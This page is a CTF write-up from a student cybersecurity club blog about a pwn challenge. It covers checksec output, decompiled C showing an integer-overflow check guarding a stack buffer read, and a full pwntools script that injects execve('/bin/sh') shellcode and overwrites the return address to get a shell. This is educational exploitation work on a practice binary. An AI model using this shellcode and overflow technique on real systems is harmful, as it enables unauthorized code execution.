<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>The Physicist's Quest</title><meta content="The Physicist's Quest" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/physicistquest/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="The Physicist's Quest" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/physicistquest/ property=twitter:url><meta content="The Physicist's Quest" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/RVCExIITBFinals/physicistquest/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>physicistquest</span></div><time datetime=2024-07-04>Published on: <span class=accent-data>2024-07-04</span></time><address rel=author>By <span class=accent-data> Abhinav I S, and exploiitm </span></address><h1>The Physicist's Quest</h1><p>First, we run checksec on the binary<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>checksec --file</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>challenge
</span></code></pre><br><div class=textCenter><img alt="Alt Text" src=image1.png></div><p>NX disabled indicates we can execute from stack, hence this is likely a shellcode injection challenge.<p>Now, opening in a decompiler (Ghidra):<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>
</span><span>undefined8 </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>)
</span><span>
</span><span>{
</span><span>  </span><span style=color:#fa5c4b>int</span><span> local_70;
</span><span>  </span><span style=color:#fa5c4b>int</span><span> local_6c;
</span><span>  undefined local_68 [</span><span style=color:#d3869b>92</span><span>];
</span><span>  </span><span style=color:#fabd2f>uint</span><span> local_c;
</span><span>  
</span><span>  </span><span style=color:#fabd2f>fflush</span><span style=color:#fdf4c1>(stdout)</span><span>;
</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Hi you know my buddy"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"He\'s stuck with his research on string theory"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(
</span><span style=color:#fdf4c1>      </span><span style=color:#b8bb26>"He\'s too proud to admit it, but he needs your help. But first you will need to prove that yo u are worthy enough for this"
</span><span style=color:#fdf4c1>      )</span><span>;
</span><span>  </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"enter two magic numbers"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  </span><span style=color:#fdf4c1>__isoc99_scanf(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>DAT_001020e1,</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>local_6c)</span><span>;
</span><span>  </span><span style=color:#fdf4c1>__isoc99_scanf(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>DAT_001020e1,</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>local_70)</span><span>;
</span><span>  </span><span style=color:#fa5c4b>if </span><span>((</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1 </span><span style=color:#fe8019><</span><span> local_6c) </span><span style=color:#fe8019>&& </span><span>(</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1 </span><span style=color:#fe8019><</span><span> local_70)) {
</span><span>    local_c </span><span style=color:#fe8019>=</span><span> local_70 </span><span style=color:#fe8019>+</span><span> local_6c;
</span><span>    </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Your magic value is </span><span style=color:#fdf4c1>%d</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,(ulong)local_c)</span><span>;
</span><span>    </span><span style=color:#fa5c4b>if </span><span>((</span><span style=color:#fa5c4b>int</span><span>)local_c </span><span style=color:#fe8019>< </span><span style=color:#d3869b>0</span><span>) {
</span><span>      </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(
</span><span style=color:#fdf4c1>          </span><span style=color:#b8bb26>"Good job! Now you need to figure out my location so that I can trick my friend into meeti ng you"
</span><span style=color:#fdf4c1>          )</span><span>;
</span><span>      </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Meet us in secrecy at </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,local_68)</span><span>;
</span><span>      </span><span style=color:#fdf4c1>read(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,local_68,</span><span style=color:#d3869b>200</span><span style=color:#fdf4c1>)</span><span>;
</span><span>    }
</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
</span><span>  }
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"BAZINGA! Close but not close"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>                    </span><span style=font-style:italic;color:#928374>/* WARNING: Subroutine does not return */
</span><span>  </span><span style=color:#fabd2f>exit</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>)</span><span>;
</span><span>}
</span></code></pre><p>ok , if local_6c and local_70 are positive and their sum is negative, we can write into a buffer, and the address of this buffer is printed out.<p>The first if conditions can be achieved by <a href=https://en.wikipedia.org/wiki/Integer_overflow rel=noopener target=_blank>Integer Overflow</a>.<p>Now, we put shellcode in the buffer and overwrite the return address with the address of the buffer (the shellcode).<p>We can create our solve script:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374>#!/usr/bin/env python3
</span><span>
</span><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
</span><span>
</span><span>exe </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ELF(</span><span style=color:#b8bb26>"./challenge"</span><span style=color:#fdf4c1>)
</span><span>
</span><span>context.binary </span><span style=color:#fe8019>= </span><span>exe
</span><span style=font-style:italic;color:#928374># context.log_level = "debug"
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>conn</span><span>():
</span><span>    </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>LOCAL</span><span>:
</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>process([exe.path])
</span><span>        </span><span style=color:#fa5c4b>if </span><span>args.</span><span style=color:#fdf4c1>DEBUG</span><span>:
</span><span>            </span><span style=color:#fdf4c1>gdb.attach(r)
</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
</span><span>        r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>"rvcechalls.xyz"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>29639</span><span style=color:#fdf4c1>)
</span><span>
</span><span>    </span><span style=color:#fa5c4b>return </span><span>r
</span><span>
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
</span><span>
</span><span>    shellcode </span><span style=color:#fe8019>=  </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
</span><span>
</span><span>    r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>conn()
</span><span>    </span><span style=color:#fdf4c1>r.recv()
</span><span>    </span><span style=color:#fdf4c1>r.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"2147483645"</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fdf4c1>r.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"10"</span><span style=color:#fdf4c1>)
</span><span>    data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>r.recv()
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>" "</span><span style=color:#fdf4c1>)[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>])
</span><span>    win </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(data.split(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>" "</span><span style=color:#fdf4c1>)[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>], </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(win))
</span><span>    payload </span><span style=color:#fe8019>= </span><span>shellcode </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"A"</span><span style=color:#fe8019>*</span><span>(</span><span style=color:#d3869b>0x68</span><span style=color:#fe8019>-</span><span style=color:#d3869b>48</span><span>) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>p64(win)
</span><span>    </span><span style=font-style:italic;color:#928374># good luck pwning :)
</span><span>    </span><span style=color:#fdf4c1>r.sendline(payload)
</span><span>
</span><span>    </span><span style=color:#fdf4c1>r.interactive()
</span><span>
</span><span>
</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
</span><span>    </span><span style=color:#fdf4c1>main()
</span><span>
</span></code></pre><p>note that we need an additional 0x68-48 bytes to reach the return address since the shellcode is 48 bytes long. Shellcode was obtained from a <a href=https://shell-storm.org/shellcode/index.html rel=noopener target=_blank>Shellcode Database</a><p>Running the script spawns a shell, and we can print out the flag</p><br><div class=textCenter><img alt="Alt Text" src=image2.png></div><br><pre style=background:#282828;color:#fdf4c1aa><code><span>flag{Gre4t_Y0u_h3lp4d_h1m_TBBT}
</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>